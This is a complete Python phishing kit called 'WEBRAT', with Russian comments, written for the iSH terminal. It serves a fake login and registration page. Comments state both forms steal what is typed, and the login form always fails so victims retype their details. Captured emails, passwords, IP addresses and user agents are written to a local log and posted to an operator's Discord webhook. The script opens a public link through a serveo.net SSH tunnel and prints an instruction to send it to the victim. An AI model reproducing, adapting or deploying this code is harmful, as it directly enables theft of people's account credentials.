#!/usr/bin/env python3
# WEBRAT by @DADILK - ПРОФЕССИОНАЛЬНЫЙ ФИШИНГ
# ДЛЯ ISH - КРАДЕТ ЛОГИНЫ И ПАРОЛИ

import http.server
import socketserver
import json
import datetime
import threading
import time
import subprocess
import os
import random
import string
import sys
import requests
import urllib.parse

# ============================================
# ФАЙЛЫ ДЛЯ СОХРАНЕНИЯ
# ============================================
CONFIG_FILE = '/sdcard/webrat_config.json'
LOG_FILE = '/sdcard/webrat_logs.txt'

# ============================================
# ЗАГРУЗКА/СОХРАНЕНИЕ НАСТРОЕК
# ============================================
def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {"webhook": ""}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

# ============================================
# HTML СТРАНИЦА WEBRAT
# ============================================
WEBRAT_PAGE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WEBRAT by @DADILK</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            max-width: 450px;
            width: 100%;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: slideUp 0.5s ease;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo {
            font-size: 48px;
            font-weight: 800;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
            letter-spacing: 2px;
        }
        .logo span {
            font-size: 18px;
            display: block;
            color: #666;
            -webkit-text-fill-color: #666;
        }
        .title {
            font-size: 24px;
            color: #333;
            margin-bottom: 10px;
        }
        .subtitle {
            color: #666;
            font-size: 14px;
            margin-bottom: 30px;
        }
        .tab-container {
            display: flex;
            margin-bottom: 30px;
            border-bottom: 2px solid #f0f0f0;
        }
        .tab {
            flex: 1;
            text-align: center;
            padding: 15px;
            cursor: pointer;
            color: #666;
            font-weight: 500;
            transition: all 0.3s;
            position: relative;
        }
        .tab.active {
            color: #667eea;
        }
        .tab.active::after {
            content: '';
            position: absolute;
            bottom: -2px;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(135deg, #667eea, #764ba2);
        }
        .form {
            display: none;
        }
        .form.active {
            display: block;
            animation: fadeIn 0.5s;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-size: 14px;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 15px;
            border: 2px solid #f0f0f0;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s;
        }
        input:focus {
            border-color: #667eea;
            outline: none;
        }
        .button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
            margin: 20px 0;
        }
        .button:hover {
            transform: translateY(-2px);
        }
        .message {
            text-align: center;
            padding: 15px;
            border-radius: 10px;
            font-size: 14px;
            margin: 20px 0;
            display: none;
        }
        .success-message {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error-message {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #999;
            font-size: 12px;
        }
        .footer a {
            color: #667eea;
            text-decoration: none;
        }
        .dev {
            margin-top: 10px;
            color: #764ba2;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                WEBRAT
                <span>by @DADILK</span>
            </div>
        </div>
        
        <div class="tab-container">
            <div class="tab active" onclick="switchTab('login')">Вход</div>
            <div class="tab" onclick="switchTab('register')">Регистрация</div>
        </div>
        
        <!-- ФОРМА ВХОДА (КРАДЕТ ДАННЫЕ) -->
        <div id="loginForm" class="form active">
            <div class="subtitle">Войдите в свой аккаунт</div>
            
            <div class="input-group">
                <label>Email или номер телефона</label>
                <input type="text" id="loginEmail" placeholder="example@mail.com" required>
            </div>
            
            <div class="input-group">
                <label>Пароль</label>
                <input type="password" id="loginPassword" placeholder="············" required>
            </div>
            
            <button class="button" onclick="login()">Войти</button>
            
            <div id="loginError" class="message error-message">
                Неверный email или пароль
            </div>
        </div>
        
        <!-- ФОРМА РЕГИСТРАЦИИ (ТОЖЕ КРАДЕТ ДАННЫЕ) -->
        <div id="registerForm" class="form">
            <div class="subtitle">Создайте новый аккаунт</div>
            
            <div class="input-group">
                <label>Имя пользователя</label>
                <input type="text" id="regName" placeholder="username" required>
            </div>
            
            <div class="input-group">
                <label>Email</label>
                <input type="email" id="regEmail" placeholder="example@mail.com" required>
            </div>
            
            <div class="input-group">
                <label>Пароль</label>
                <input type="password" id="regPassword" placeholder="············" required>
            </div>
            
            <button class="button" onclick="register()">Зарегистрироваться</button>
            
            <div id="registerSuccess" class="message success-message">
                Регистрация успешна! Войдите в аккаунт.
            </div>
        </div>
        
        <div class="footer">
            <div>WEBRAT v2.0 - Профессиональная платформа</div>
            <div class="dev">Разработано @DADILK</div>
            <div style="margin-top: 10px;">&copy; 2024 WEBRAT. Все права защищены.</div>
        </div>
    </div>

    <script>
        function switchTab(tab) {
            // Переключение табов
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.form').forEach(f => f.classList.remove('active'));
            
            if (tab === 'login') {
                document.querySelectorAll('.tab')[0].classList.add('active');
                document.getElementById('loginForm').classList.add('active');
            } else {
                document.querySelectorAll('.tab')[1].classList.add('active');
                document.getElementById('registerForm').classList.add('active');
            }
        }
        
        function login() {
            const email = document.getElementById('loginEmail').value;
            const password = document.getElementById('loginPassword').value;
            const errorMsg = document.getElementById('loginError');
            
            if (!email || !password) {
                errorMsg.textContent = 'Заполните все поля';
                errorMsg.style.display = 'block';
                return;
            }
            
            // Отправляем данные на сервер
            fetch('/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type: 'login',
                    email: email,
                    password: password,
                    userAgent: navigator.userAgent,
                    time: new Date().toLocaleString()
                })
            })
            .then(response => response.json())
            .then(data => {
                // Показываем ошибку (вход всегда неудачный)
                errorMsg.style.display = 'block';
                document.getElementById('loginPassword').value = '';
            });
        }
        
        function register() {
            const name = document.getElementById('regName').value;
            const email = document.getElementById('regEmail').value;
            const password = document.getElementById('regPassword').value;
            const successMsg = document.getElementById('registerSuccess');
            
            if (!name || !email || !password) {
                alert('Заполните все поля');
                return;
            }
            
            // Отправляем данные на сервер
            fetch('/register', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type: 'register',
                    name: name,
                    email: email,
                    password: password,
                    userAgent: navigator.userAgent,
                    time: new Date().toLocaleString()
                })
            })
            .then(response => response.json())
            .then(data => {
                // Показываем успех
                successMsg.style.display = 'block';
                
                // Очищаем форму
                document.getElementById('regName').value = '';
                document.getElementById('regEmail').value = '';
                document.getElementById('regPassword').value = '';
                
                // Переключаем на вход через 2 секунды
                setTimeout(() => {
                    successMsg.style.display = 'none';
                    switchTab('login');
                }, 2000);
            });
        }
    </script>
</body>
</html>"""

# ============================================
# HTTP HANDLER
# ============================================
class WebRatHandler(http.server.SimpleHTTPRequestHandler):
    webhook_url = ""
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(WEBRAT_PAGE.encode('utf-8'))
        elif self.path == '/style.css':
            self.send_response(200)
            self.send_header('Content-type', 'text/css')
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode('utf-8'))
        
        # Добавляем IP
        data['ip'] = self.client_address[0]
        data['timestamp'] = str(datetime.datetime.now())
        
        # Определяем тип действия
        if self.path == '/login':
            self.handle_login(data)
        elif self.path == '/register':
            self.handle_register(data)
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({'status': 'ok'}).encode())
    
    def handle_login(self, data):
        """Обработка попытки входа"""
        print("\n" + "="*60)
        print("🔴 WEBRAT - ПОПЫТКА ВХОДА")
        print("="*60)
        print(f"📧 Email: {data['email']}")
        print(f"🔑 Пароль: {data['password']}")
        print(f"🌐 IP: {data['ip']}")
        print(f"🕐 Время: {data['timestamp']}")
        print("="*60)
        
        # Сохраняем в файл
        with open(LOG_FILE, 'a') as f:
            f.write(json.dumps(data) + '\n')
        
        # Отправляем в Discord
        if self.webhook_url:
            self.send_to_discord(data, "ПОПЫТКА ВХОДА")
    
    def handle_register(self, data):
        """Обработка регистрации"""
        print("\n" + "="*60)
        print("🟢 WEBRAT - НОВАЯ РЕГИСТРАЦИЯ")
        print("="*60)
        print(f"👤 Имя: {data['name']}")
        print(f"📧 Email: {data['email']}")
        print(f"🔑 Пароль: {data['password']}")
        print(f"🌐 IP: {data['ip']}")
        print(f"🕐 Время: {data['timestamp']}")
        print("="*60)
        
        # Сохраняем в файл
        with open(LOG_FILE, 'a') as f:
            f.write(json.dumps(data) + '\n')
        
        # Отправляем в Discord
        if self.webhook_url:
            self.send_to_discord(data, "НОВАЯ РЕГИСТРАЦИЯ")
    
    def send_to_discord(self, data, action):
        """Отправка в Discord Webhook"""
        try:
            # Формируем сообщение
            if action == "ПОПЫТКА ВХОДА":
                color = 15548997  # красный
                fields = [
                    {"name": "📧 Email/Логин", "value": f"```{data['email']}```", "inline": False},
                    {"name": "🔑 Пароль", "value": f"```{data['password']}```", "inline": False}
                ]
            else:  # регистрация
                color = 5763719  # зеленый
                fields = [
                    {"name": "👤 Имя", "value": f"```{data['name']}```", "inline": False},
                    {"name": "📧 Email", "value": f"```{data['email']}```", "inline": False},
                    {"name": "🔑 Пароль", "value": f"```{data['password']}```", "inline": False}
                ]
            
            # Добавляем общие поля
            fields.extend([
                {"name": "🌐 IP Адрес", "value": f"```{data['ip']}```", "inline": True},
                {"name": "🕐 Время", "value": f"```{data['timestamp']}```", "inline": True},
                {"name": "📱 User Agent", "value": f"```{data.get('userAgent', 'N/A')[:100]}...```", "inline": False}
            ])
            
            webhook_data = {
                "embeds": [{
                    "title": f"🔴 WEBRAT by @DADILK - {action}",
                    "color": color,
                    "fields": fields,
                    "footer": {"text": f"WEBRAT v2.0 | {data['ip']}"}
                }]
            }
            
            response = requests.post(self.webhook_url, json=webhook_data)
            if response.status_code == 204:
                print(f"✅ Отправлено в Discord: {action}")
            else:
                print(f"❌ Ошибка отправки: {response.status_code}")
                
        except Exception as e:
            print(f"❌ Ошибка отправки в Discord: {e}")

# ============================================
# ФУНКЦИИ ДЛЯ РАБОТЫ
# ============================================
def get_local_ip():
    try:
        result = subprocess.run(['ifconfig'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'inet ' in line and '127.0.0.1' not in line:
                return line.split()[1]
    except:
        pass
    return '127.0.0.1'

def create_public_url(port):
    """Создает публичную ссылку через serveo.net"""
    try:
        subdomain = f"webrat-{''.join(random.choices(string.ascii_lowercase, k=6))}"
        cmd = f"ssh -R {subdomain}:80:localhost:{port} serveo.net"
        
        # Запускаем в фоне
        process = subprocess.Popen(
            cmd.split(),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        time.sleep(3)
        public_url = f"https://{subdomain}.serveo.net"
        return public_url
    except:
        return None

def view_logs():
    """Просмотр сохраненных данных"""
    if not os.path.exists(LOG_FILE):
        print("❌ Логов пока нет")
        return
    
    with open(LOG_FILE, 'r') as f:
        logs = f.readlines()
    
    print("\n" + "="*70)
    print(f"📁 WEBRAT LOGS ({len(logs)} записей)")
    print("="*70)
    
    for i, log in enumerate(logs[-20:], 1):
        try:
            data = json.loads(log)
            if data.get('type') == 'register':
                print(f"\n{i}. 🟢 РЕГИСТРАЦИЯ")
                print(f"   👤 {data.get('name', 'N/A')}")
                print(f"   📧 {data.get('email', 'N/A')}")
                print(f"   🔑 {data.get('password', 'N/A')}")
            else:
                print(f"\n{i}. 🔴 ВХОД")
                print(f"   📧 {data.get('email', 'N/A')}")
                print(f"   🔑 {data.get('password', 'N/A')}")
            print(f"   🌐 {data.get('ip', 'N/A')}")
            print(f"   🕐 {data.get('timestamp', 'N/A')}")
            print("-"*40)
        except:
            print(f"\n{i}. {log}")

def main_menu():
    """Главное меню"""
    config = load_config()
    
    while True:
        print("\n" + "="*70)
        print("🔥 WEBRAT by @DADILK - ПРОФЕССИОНАЛЬНЫЙ ФИШИНГ")
        print("="*70)
        print(f"1. Настройка Discord Webhook (текущий: {'✅' if config['webhook'] else '❌'})")
        print("2. Запустить локальный сервер")
        print("3. Запустить с публичной ссылкой")
        print("4. Просмотр сохраненных данных")
        print("5. Очистить данные")
        print("0. Выход")
        print("="*70)
        
        choice = input("Выберите действие: ").strip()
        
        if choice == "1":
            webhook = input("Введите Discord Webhook URL: ").strip()
            if webhook:
                config['webhook'] = webhook
                save_config(config)
                print("✅ Webhook сохранен!")
        
        elif choice == "2":
            if not config['webhook']:
                print("❌ Сначала настройте webhook!")
                continue
            start_server(config, public=False)
        
        elif choice == "3":
            if not config['webhook']:
                print("❌ Сначала настройте webhook!")
                continue
            start_server(config, public=True)
        
        elif choice == "4":
            view_logs()
        
        elif choice == "5":
            if os.path.exists(LOG_FILE):
                os.remove(LOG_FILE)
                print("✅ Данные очищены")
        
        elif choice == "0":
            print("Выход...")
            sys.exit(0)

def start_server(config, public=False):
    """Запуск сервера"""
    PORT = 8080
    
    print("\n" + "="*70)
    print("🚀 ЗАПУСК WEBRAT СЕРВЕРА...")
    print("="*70)
    
    # Устанавливаем webhook
    WebRatHandler.webhook_url = config['webhook']
    
    # Получаем локальный IP
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    
    print(f"\n📌 Локальная ссылка: {local_url}")
    print(f"📌 Локальный хост: http://localhost:{PORT}")
    
    if public:
        print("\n🔄 Создание публичной ссылки...")
        public_url = create_public_url(PORT)
        
        if public_url:
            print(f"✅ Публичная ссылка: {public_url}")
            print(f"\n📎 Отправьте жертве: {public_url}")
            
            # Отправляем ссылку в Discord
            try:
                webhook_data = {
                    "content": f"**🔥 WEBRAT by @DADILK - ССЫЛКА ГОТОВА**\n\n{public_url}"
                }
                requests.post(config['webhook'], json=webhook_data)
            except:
                pass
        else:
            print("❌ Не удалось создать публичную ссылку")
            print("📌 Используйте локальную ссылку")
    
    print("\n" + "="*70)
    print("⏳ WEBRAT запущен. Ожидание данных...")
    print(f"📁 Логи: {LOG_FILE}")
    print("="*70 + "\n")
    
    # Запускаем сервер
    handler = WebRatHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n\n❌ Сервер остановлен")
            httpd.shutdown()

# ============================================
# ЗАПУСК
# ============================================
if __name__ == '__main__':
    # Создаем папку для логов
    os.makedirs('/sdcard', exist_ok=True)
    
    print("""
    ╔══════════════════════════════════════════╗
    ║     🔥 WEBRAT by @DADILK v2.0           ║
    ║     ПРОФЕССИОНАЛЬНЫЙ ФИШИНГ             ║
    ║     ДЛЯ ISH ТЕРМИНАЛА                    ║
    ╚══════════════════════════════════════════╝
    
    🔥 ОСОБЕННОСТИ:
    • Вход - всегда ошибка (крадет данные)
    • Регистрация - всегда успех (крадет данные)
    • Сохранение всех данных
    • Отправка в Discord Webhook
    • Публичная ссылка через serveo.net
    """)
    
    main_menu()
